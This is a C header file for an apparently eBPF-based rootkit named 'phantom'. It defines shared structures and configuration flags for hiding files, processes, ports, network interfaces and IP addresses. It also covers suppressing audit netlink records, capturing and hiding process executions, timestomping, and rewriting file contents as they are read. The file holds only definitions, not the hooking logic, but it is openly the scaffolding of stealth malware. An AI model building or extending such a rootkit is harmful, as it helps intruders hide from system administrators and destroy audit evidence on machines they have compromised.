/* SPDX-License-Identifier: MIT */
/*
 * phantom.h - Shared definitions for BPF kernel code and userspace.
 *
 * Defines structures and constants that both sides must agree on
 * for data exchange (events, configuration, filter rules).
 */

#ifndef __PHANTOM_COMMON_H
#define __PHANTOM_COMMON_H

#include "phantom_limits.h"

/*
 * Dense bitmaps for port/PID hiding.
 *
 * Compact representation: 8 values per byte, where each bit
 * indicates whether a specific port/PID is hidden.
 *
 * HIDDEN_PORT_BITMAP_BYTES: 8192 bytes covers all 65536 ports (0..65535)
 * HIDDEN_PID_BITMAP_BYTES:  524288 bytes covers PIDs up to 4194303
 */
#define HIDDEN_PORT_BITMAP_BYTES 8192   /* 8192 bytes * 8 bits = 65536 ports */
#define HIDDEN_PID_BITMAP_BYTES  524288 /* 524288 bytes * 8 bits = 4194304 PIDs */
#define HIDDEN_PID_MAX           (HIDDEN_PID_BITMAP_BYTES * 8 - 1)

/*
 * Event types - messages sent from BPF to userspace when hiding occurs.
 */
enum event_type {
    EVENT_FILE_HIDDEN = 1,      /* File hidden from ls/dir */
    EVENT_PROCESS_HIDDEN = 2,   /* Process hidden from ps/ls /proc */
    EVENT_PORT_HIDDEN = 3,      /* Port hidden from ss/netstat */
    EVENT_AUDIT_BLOCKED = 4,    /* Audit netlink record suppressed */
    EVENT_TIMESTOMP = 5,        /* File timestamps modified (userspace only) */
    EVENT_ERROR = 6,            /* Error or debug event during hiding */
    EVENT_EXEC_CAPTURED = 7,    /* Process execution captured and suppressed */
    EVENT_FILE_LINE_HIDDEN = 8, /* Line hidden from filtered file */
    EVENT_FILE_REPLACED = 9,    /* String replaced in filtered file */
    EVENT_IFACE_HIDDEN = 10,    /* Network interface hidden (ip a / ifconfig) */
    EVENT_IP_HIDDEN = 11,       /* IP hidden from ip a / sniffer */
};

/*
 * struct event - Message from BPF to userspace.
 *
 * Fields:
 *   type      - Event type (enum event_type)
 *   pid       - Process ID that triggered the event
 *   tid       - Thread ID
 *   success   - Whether hiding succeeded (1=yes, 0=no)
 *   comm      - Process name (e.g., "bash")
 *   filename  - Hidden file name (if applicable)
 *   inode     - File's inode number
 *   port      - Hidden port number (if applicable)
 */
struct event {
    __u32 type;
    __u32 pid;
    __u32 tid;
    __u32 success;
    char comm[TASK_COMM_LEN];
    char filename[MAX_FILENAME_LEN];
    __u64 inode;
    __u32 port;
    __u32 padding;
};

/*
 * struct getdents_data - Context for getdents/getdents64 syscall hooking.
 *
 * Saved between syscall enter and exit for directory listing modification.
 * Fields:
 *   dirp  - Pointer to directory buffer in userspace
 *   count - Buffer size from syscall
 *   fd    - Directory file descriptor
 */
struct getdents_data {
    __u64 dirp;
    __u64 count;
    __u32 fd;
    __u32 padding;
};

/*
 * Config indices - keys for the feature_config BPF map.
 *
 * Each index controls whether a feature is enabled (1) or disabled (0).
 * BPF reads: FILE, PROCESS, PORT, EXEC, FILE_FILTER, IFACE, IP.
 * AUDIT_BLOCKING and TIMESTOMP are userspace-only bookkeeping.
 */
#define CFG_ENABLE_FILE_HIDING    0  /* File hiding */
#define CFG_ENABLE_PROCESS_HIDING 1  /* Process hiding */
#define CFG_ENABLE_PORT_HIDING    2  /* Port hiding */
#define CFG_ENABLE_AUDIT_BLOCKING 3  /* Audit blocking (userspace only) */
#define CFG_ENABLE_TIMESTOMP      4  /* Timestomp (userspace only) */
#define CFG_ENABLE_EXEC_HIDING    5  /* Exec capture + audit/syslog filter */
#define CFG_ENABLE_FILE_FILTER   6  /* File content filtering */
#define CFG_ENABLE_IFACE_HIDING  7  /* Interface hiding */
#define CFG_ENABLE_IP_HIDING     8  /* IP address hiding */

/*
 * File Content Filtering
 *
 * Supports line hiding and string replacement in file read buffers.
 */

/*
 * struct file_filter_rule - A single file content filter rule.
 *
 * When a process reads a monitored file, BPF checks the buffer
 * against this rule and applies the action.
 */
struct file_filter_rule {
    char search[MAX_FILE_FILTER_SEARCH];
    char replace[MAX_FILE_FILTER_REPLACE];
    __u8 mode;
    __u8 search_len;
    __u8 replace_len;
    __u8 padding[5];
};

/*
 * struct file_leftover_ctx - Partial-line tracking between reads.
 *
 * Currently unused; the map keyed by this type is cleared on close.
 */
struct file_leftover_ctx {
    char data[128];
    __u32 len;
    __u32 padding;
};

#endif /* __PHANTOM_COMMON_H */
